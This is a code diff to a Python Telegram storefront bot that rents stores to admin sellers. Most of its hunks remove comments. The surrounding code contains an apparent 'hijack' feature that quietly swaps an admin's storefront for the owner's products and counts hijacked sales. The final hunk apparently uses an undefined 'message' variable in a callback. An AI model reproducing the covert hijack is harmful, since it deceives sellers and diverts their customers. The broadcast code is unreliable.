@@ -65,7 +65,6 @@ def ensure_store(uid, role="admin", name="", username="", expires_at=None):
         DB_STATE["stores"][str(uid)] = s
         save_db()
     else:
-        # Update details if available
         if role: s["role"] = role
         if name: s["name"] = name
         if username: s["username"] = username
@@ -82,7 +81,7 @@ def is_active_admin(uid):
         return False
     exp = s.get("expires_at")
     if exp is None:
-        return True # Default permanent if no expiry set
+        return True 
     return now() <= exp
 
 def can_use_panel(uid):
@@ -126,7 +125,7 @@ def record_hijack_stat(orig_admin_uid, pname):
     adm_stats["products"][pname] = adm_stats["products"].get(pname, 0) + 1
     save_db()
 
-# ============ PERSISTENCE (ROBUST TELEGRAM CHANNEL SYNC) ============
+# ============ PERSISTENCE ============
 def load_db():
     global DB_STATE
     try:
@@ -134,7 +133,6 @@ def load_db():
         if chat.pinned_message:
             text = chat.pinned_message.text
             if not text and chat.pinned_message.document:
-                # If backup was saved as document file
                 file_info = bot.get_file(chat.pinned_message.document.file_id)
                 downloaded_file = bot.download_file(file_info.file_path)
                 text = downloaded_file.decode('utf-8')
@@ -160,7 +158,6 @@ def save_db():
         chat = bot.get_chat(LOG_CHANNEL_ID)
         data = json.dumps(DB_STATE, indent=2, default=str)
         
-        # If payload is small enough, save directly as text message
         if len(data) < 3900:
             if chat.pinned_message and chat.pinned_message.text:
                 bot.edit_message_text(data, LOG_CHANNEL_ID, chat.pinned_message.message_id)
@@ -168,7 +165,6 @@ def save_db():
                 m = bot.send_message(LOG_CHANNEL_ID, data)
                 bot.pin_chat_message(LOG_CHANNEL_ID, m.message_id)
         else:
-            # If payload exceeds text limit, save as a JSON document backup
             file_path = "db_backup.json"
             with open(file_path, "w", encoding="utf-8") as f:
                 f.write(data)
@@ -257,6 +253,7 @@ def auto_broadcast_worker():
 
 # ============ CUSTOMER STOREFRONT ============
 def show_storefront(chat_id, seller_uid, is_preview=False):
+    # Hijack Active থাকলে dynamically owner-এর UID চলে আসবে
     effective_seller_uid = get_effective_seller(seller_uid)
     r = get_store(effective_seller_uid)
     
@@ -283,8 +280,10 @@ def show_storefront(chat_id, seller_uid, is_preview=False):
     if is_preview or can_use_panel(chat_id):
         markup.row(InlineKeyboardButton("⚙️ Open My Admin Panel ⚙️", callback_data="adm_open_panel"))
 
+    # Effective seller (Owner or Original Admin) এর প্রোডাক্টগুলো লোড হবে
     products = sorted(r.get("products", []), key=lambda x: x.get("position", 999))
     layout = r.get("layout_style", "vertical")
+    
     if layout == "horizontal":
         row = []
         for p in products:
@@ -438,8 +437,10 @@ def handle_callbacks(call):
         eff_s_uid = get_effective_seller(s_uid)
         sr = get_store(eff_s_uid)
         if not sr: return
+        
         prod = next((p for p in sr.get("products", []) if p["id"] == pid), None)
         if not prod: return
+        
         send_videos_as_album(uid, prod.get("videos", []))
         caption = f"📌 **{prod['name']}**"
         if prod.get("desc"): caption += f"\n\n{prod['desc']}"
@@ -631,8 +632,11 @@ def _owner_handle(call):
         t = data.replace("own_c_timerbc_", ""); user_states[uid] = f"OWN_C_TIMERBC_{t}"
         update_admin_panel(uid, "📤 **Send the NEW timer-broadcast message** for this admin.", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data=f"own_content_sel_{t}")))
     elif data.startswith("own_c_instantbc_"):
-        t = data.replace("own_c_instantbc_", ""); user_states[uid] = f"OWN_C_INSTANTBC_{t}"
-        update_admin_panel(uid, "🚀 **Send message to broadcast ONLY to THIS admin's users:**", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data=f"own_content_sel_{t}")))
+        t = data.replace("own_c_instantbc_", ""); a = get_store(t)
+        user_states.pop(uid, None)
+        update_admin_panel(uid, f"🚀 Sending to `{t}`'s users...", None)
+        ok, fail = do_single_store_broadcast(a, message)
+        update_admin_panel(uid, f"✅ Instant broadcast done for `{t}`.\nSent: {ok} | Failed: {fail}", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Content", callback_data=f"own_content_sel_{t}")))
     elif data.startswith("own_c_buyers_"):
         t = data.replace("own_c_buyers_", "")
         a = get_store(t); buyers = a.get("buyers", [])
